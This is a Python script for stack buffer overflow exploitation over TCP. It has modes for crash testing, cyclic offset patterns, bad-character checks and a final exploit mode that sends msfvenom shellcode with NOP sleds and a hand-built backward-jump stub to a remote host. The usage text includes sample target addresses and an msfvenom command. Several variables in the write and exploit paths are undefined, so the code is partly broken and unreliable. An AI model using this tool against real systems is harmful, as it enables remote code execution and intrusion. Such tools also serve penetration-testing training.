#!/usr/bin/python3
#
# ig-buffer-overflow.py
#
# Isabelle's generic buffer overflow tool
#

import sys
import socket
import binascii
import getopt

VERBOSE = True

# Script usage
def print_usage(scriptName):
	print("Usages:")
	print("")
	print("test - Sends simple string (AAAAA) with buffer size and buffer head for memory test")
	print(" {} -m test --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/'".format(scriptName))
	print("")

	print("cyclic - Sends cyclic string to help identify memory positions")
	print(" {} -m cyclic --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/'".format(scriptName))
	print("")

	print("write - Writes hex value to buffer offset")
	print(" {} -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809".format(scriptName))
	print("")

	print("write - Write badchars (before or after offset content) for badchar verification")
	print(" {} -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --badchar=after --exclude=000a".format(scriptName))
	print(" {} -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --badchar=before --exclude=000a --reversejmp=800".format(scriptName))
	print("")

	print("exploit - Sends malicious payload via buffer overflow")
	print(" {} -m exploit --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --reversejmp=800 --shellcode=payload --nops=10".format(scriptName))
	print("")

	print("Parameters:")
	print("")
	print(" --help|-h	: Show script usage.")
	print(" --norec|-n	: Don't wait for receive message after connect.")
	print(" --mode|-m	: Select script mode (test|cyclic|write|exploit).")
	print(" --rhost		: Remote host IP.")
	print(" --rport		: Remote host port.")
	print(" --buffsize	: Amount of variable bytes to send.")
	print(" --buffhead	: Static buffer string set at the beginning of the buffer.")
	print("		 Is usually the crash string. Size is considered in buffSize calc.")
	print(" --offset	: Place in buffer where content can be added.")
	print(" --hexcontent	: Hex string to add at the offset position.")
	print("		Can be considered as big endian (default) or little endian (will be reversed).")
	print("		Use 'g' or 'l' to delimit the order. Examples:")
	print("		'g01020304l05060708' --> will send '0102030408070605'")
	print("		'01020304' --> will send '01020304'")
	print(" --badchar	: Adds bad chars before (before) or after (after) the content. Used for bad char testing.")
	print(" --exclude	: List of chars (formatted as hex string) to be excluded from badchar list.")
	print(" --reversejmp	: Size in bytes to jump before the content to inject bad chars or the shell code.")
	print(" --shellcode	: Python shell code file generated using msfvenom. Do NOT include the .py extension in the parameter.")
	print("		Example: msfvenom -p windows/exec cmd=calc.exe -b '\\x00' -f python -v payload EXITFUNC=thread -o payload")
	print(" --nops		: Amount of nops to add before and after the shell code. Default is 0.")


# Auxiliary functions ###################################################################
#########################################################################################

# Creates cyclic pattern
# Adapted from: https://github.com/ickerwx/pattern/blob/master/pattern
def create_cyclic_pattern(length = 8192):
	pattern = ''
	parts = ['A', 'a', '0']

	while len(pattern) != length:
		pattern += parts[len(pattern) % 3]
		if len(pattern) % 3 == 0:
			parts[2] = chr(ord(parts[2]) + 1)
			if parts[2] > '9':
				parts[2] = '0'
				parts[1] = chr(ord(parts[1]) + 1)
				if parts[1] > 'z':
					parts[1] = 'a'
					parts[0] = chr(ord(parts[0]) + 1)
					if parts[0] > 'Z':
						parts[0] = 'A'
	
	print("Cyclic pattern:", pattern) if VERBOSE else None

	return pattern

# Checks if hex string value is valid
def is_valid_hex(content, size):
	if len(content) % 2 != 0:
		return False

	# Check if it is valid hex value
	try:
		intVal = int(content, 16) 
	except:
		return False

	if size == 0 or len(content) == size:
		return True
	
	return False

# Creates bad char string
# Example: create_bad_chars(0,'000a')
# Adapted from: https://gist.github.com/rverton/64589ac9f5c035100ab40501b17cdf63
def create_bad_chars(start, excludeChars):
	if excludeChars and not is_valid_hex(excludeChars, 0):
		print("Error: excludeChars is not a valid hex string")
		sys.exit(1);


	hexChars = [excludeChars[i:i+2] for i in range(0, len(excludeChars), 2)]
	exclude = [int(i, 16) for i in hexChars]

	print("Excluded bad chars:", hexChars) if VERBOSE else None

	badChars = ""

	for nr in range(start,255+1):
		if nr in exclude:
			continue
		badChars = badChars + '{:02x}'.format(nr)

	return binascii.unhexlify(badChars)

# Reverses hex string
def hex_reverse(values):
	reverseVal = ""
	for val in values:
		reverseVal = reverseVal + "".join(reversed([val[i:i+2] for i in range(0, len(val), 2)]))

	return reverseVal

# Gets binary content
# ./ig_buffer_overflow.py write 10.2.31.155 2048 5009 'cmd2 /.:/' 1203 l0102030405g0607080910l1122l44
def get_binary_content(writeContent):
	if not is_valid_hex(writeContent.replace("g", "").replace("l", ""), 0):
		print("Error: hexcontent is not a valid hex string")
		sys.exit(1);

	finalContent = ""

	gSplit = writeContent.split("g")
	for content in gSplit:
		if "l" in content:
			lSplit =  content.split("l")
			finalContent = finalContent + lSplit[0] + hex_reverse(lSplit[1:])
		else:
			finalContent = finalContent + content
				
	print("Binary content:", finalContent) if VERBOSE else None

	return binascii.unhexlify(finalContent)

# Creates backwards jmp instruction
# So as not to depend on external asm compilers or opcode generators, the following long jump code can only jump numbers divisible by 256. The following assembly code is used to jmp backwards (ref.: phrack #62 article 7, Aaron Adams):
#	fldz     		; D9EE
#	fnstenv [esp-12]  	; D97424F4
#	pop ecx    		; 59
#	add cl,10   		; 80C10A
#	nop     		; 90
#	dec ch    		; FECD (repeated to add 256*mult jmp size)
#	jmp ecx    		; FFE1  
def create_reverve_jmp(mult):
	head = "D9EED97424F45980C10A90"
	tail = "FFE1"
	jmp=""

	for i in range(0, int(mult)):
		jmp = jmp + "FECD"

	jmpCmd = head + jmp + tail

	print("Reverse jmp:", jmpCmd) if VERBOSE else None

	return binascii.unhexlify(jmpCmd)

# Create payload functions ##############################################################
#########################################################################################

# test
def create_test_payload(buffHead, buffSize):
	buff = b'A' * buffSize
	payload = buffHead + buff

	return payload

# cyclic
def create_cyclic_payload(buffHead, buffSize):
	cyclicPattern = create_cyclic_pattern(buffSize)
	payload = buffHead + cyclicPattern.encode()

	return payload

# write
def create_write_payload(buffHead, buffSize, offsetCount, binContent):
	# offset
	offset = b'A' * int(offsetCount)

	# tail
	tail = b'C' * (buffSize - len(offset) - len(binContent))

	# payload
	payload = buffHead + offset + binContent + tail

	return payload

# write - bad chars before content
def create_badchar_payload_before(buffHead, buffSize, offsetCount, binContent, reverseJmpSize, excludeChars=""):
	# badchars
	badChars = create_bad_chars(0, excludeChars)

	# offset
	offset = b'A' * (offsetCount - len(badChars))

	# Limitation: reverse jump can only be divisible by 256
	tJmp = reverseJmpSize % 256

	if tJmp == 0:
		# tail
		tail = b'Z' * (buffSize - len(offset) - len(badChars) - len(binContent))
		
		# payload
		payload = buffHead + offset + badChars + binContent + tail		
	else:
		reverseJmp = create_reverve_jmp(tJmp)

		# tail
		tail = b'Z' * (buffSize - len(offset) - len(badChars) - len(binContent) - len(reverseJmp))
		
		# payload
		payload = buffHead + offset + badChars + binContent + reverseJmp + tail


	return payload

# write - bad chars after content
def create_badchar_payload_after(buffHead, buffSize, offsetCount, binContent, excludeChars=""):
	# offset
	offset = b'A' * int(offsetCount)

	# badchars
	badChars = create_bad_chars(0, excludeChars)

	# tail
	tail = b'C' * (buffSize - len(offset) - len(binContent) - len(badChars))

	# payload
	payload = buffHead + offset + binContent + badChars + tail

	return payload

# exploit
def create_exploit_payload(buffHead, buffSize, offsetCount, binContent, reverseJmpSize, shellCodeFile, nopsSize = 2):
	# nops
	nops = b'\x90' * nopsSize

	# shellcode
	shellCodeFile = sys.argv[9]
	shellCodeModule = __import__(shellCodeFile)
	shellCode = shellCodeModule.payload	

	# Limitation: reverse jump can only be divisible by 256
	tJmp = reverseJmpSize % 256

	if tJmp == 0:
		# offset
		offset = b'A' * int(offsetCount)

		# tail
		tail = b'C' * (buffSize - len(offset) - len(binContent) - len(nops) - len(shellCode) - len(nops))

		# payload
		payload = buffHead + offset + binContent + nops + shellCode + nops + tail

	else:
		# offset	
		offset = b'A' * (int(offsetCount) - len(shellCode))

		reverseJmp = create_reverve_jmp(tJmp)

		# tail
		tail = b'Z' * (buffSize - len(offset) - len(nops) - len(shellCode) - len(nops) - len(binContent) - len(reverseJmp))

		# payload
		payload = buffHead + offset + nops + shellCode + nops + binContent + reverseJmp + tail

	return payload

		


# Main execution block ##################################################################
#########################################################################################

if __name__ == "__main__":
	DEFAULT_SOCKET_BUFF_SIZE = 1024
	scriptName = sys.argv[0]

	# Avaiable modes
	AVAILABLE_MODES = ["test", "cyclic", "write", "exploit"]

	# Input parameters
	try:
		opts, args = getopt.getopt(sys.argv[1:], "hnm:", ["help", "norec", "mode=", "rhost=", "rport=", "buffhead=", "buffsize=", "offset=", "hexcontent=", "badchar=", "exclude=", "reversejmp=", "shellcode=", "nops="])
	except getopt.GetoptError as err:
		print("Error:", err)
		print_usage(scriptName)
		sys.exit(1)	
	
	# Default values
	norec = False
	mode = ""
	rhost = ""
	rport = 0
	buffSizeParam = 0
	buffHead = b''
	offset = 0
	hexContent = ""
	badCharOption = ""
	badCharExcluded = ""
	reverseJmpSize = 0
	shellCodeFile = ""
	nops = 0

	# Verify options
	for opt, value in opts:
		if opt in ("-h", "--help"):
			print_usage(scriptName)
			sys.exit(1)	
		elif opt in ("-n", "--norec"):
			norec = True
		elif opt in ("-m", "--mode"):
			mode = value
			if mode not in AVAILABLE_MODES:
				print("Error: unknown mode.")
				print_usage(scriptName)
				sys.exit(1);
		elif opt == '--rhost':
			rhost = value
		elif opt == '--rport':
			rport = int(value)
		elif opt == '--buffhead':
			buffHead = str.encode(value)
		elif opt == '--buffsize':
			buffSizeParam = int(value)
		elif opt == '--offset':
			offset = int(value)
		elif opt == '--hexcontent':
			hexContent = value
		elif opt == '--badchar':
			badCharOption = value
		elif opt == '--exclude':
			badCharExcluded = value
		elif opt == '--reversejmp':
			reverseJmpSize = int(value)
		elif opt == '--shellcode':
			shellCodeFile = value
		elif opt == '--nops':
			nops = int(value)
		else:
			print("Error: Unknown parameter")
			print_usage(scriptName)
			sys.exit(1)


	print("Arguments: mode={} | norec={} | rhost={} | rport={} | buffhead={} | buffsize={} | offset={} | hexcontent={} | badchar={} | exclude={} | reversejmp={} | shellcode={} | nops={}".format(mode, norec, rhost, rport, buffHead, buffSizeParam, offset, hexContent, badCharOption, badCharExcluded, reverseJmpSize, shellCodeFile, nops)) if VERBOSE else None

	if not mode or not rhost or not rport or not buffSizeParam:
		print("Error: incorrect minimum number of params.")
		print_usage(scriptName)
		sys.exit(1);

	buffSize = buffSizeParam - len(buffHead)

	# Verify mode and create payload
	buffPayload = ""

	if mode == 'test':
		buffPayload = create_test_payload(buffHead, buffSize)

	elif mode == 'cyclic':
		buffPayload = create_cyclic_payload(buffHead, buffSize)

	elif mode == 'write':
		if not hexContent:
			print("Error: incorrect number of params for --mode=write.")
			sys.exit(1);

		binContent = get_binary_content(hexContent)

		if badCharOption == 'before':
			if not reverseJmpSize:
				print("Error: incorrect number of params for --mode=write, --badchar=before.")
				sys.exit(1);

			buffPayload = create_badchar_payload_before(buffHead, buffSize, offset, binContent, reverseJmpSize, excludedChars)

		elif badCharOption == 'after':
			buffPayload = create_badchar_payload_after(buffHead, buffSize, offset, binContent, excludedChars)
			
		else:
			buffPayload = create_write_payload(buffHead, buffSize, offset, binContent)

	elif mode == 'exploit':
		get_binary_content(writeContent)

		buffPayload = create_exploit_payload(buffHead, buffSize, offset, binContent, reverseJmpSize, shellCodeFile, nops)
	else:
		print("Error: incorrect number of params.")
		print_usage(scriptName)
		sys.exit(1);


	print("") if VERBOSE else None

	# Create socket
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		# Connect to rhost and rport
		connect = s.connect((rhost, rport))

		print("Started socket communication") if VERBOSE else None

		# Application connection return
		if not norec:
			r = s.recv(DEFAULT_SOCKET_BUFF_SIZE)
			print(r) if VERBOSE else None

		# Send payload
		print("") if VERBOSE else None
		print("Sending payload with size {}".format(len(buffPayload))) if VERBOSE else None
		print(buffPayload) if VERBOSE else None
		print("") if VERBOSE else None

		s.send(buffPayload)

		# Application payload return
		r = s.recv(DEFAULT_SOCKET_BUFF_SIZE)

		print("Payload return") if VERBOSE else None
		print(r) if VERBOSE else None

	except KeyboardInterrupt:
		print("Exit: Keyboard Interrupt")
	except:
		print("Error: Unexpected error.", sys.exc_info()[0])
		raise
	finally:
		s.close()

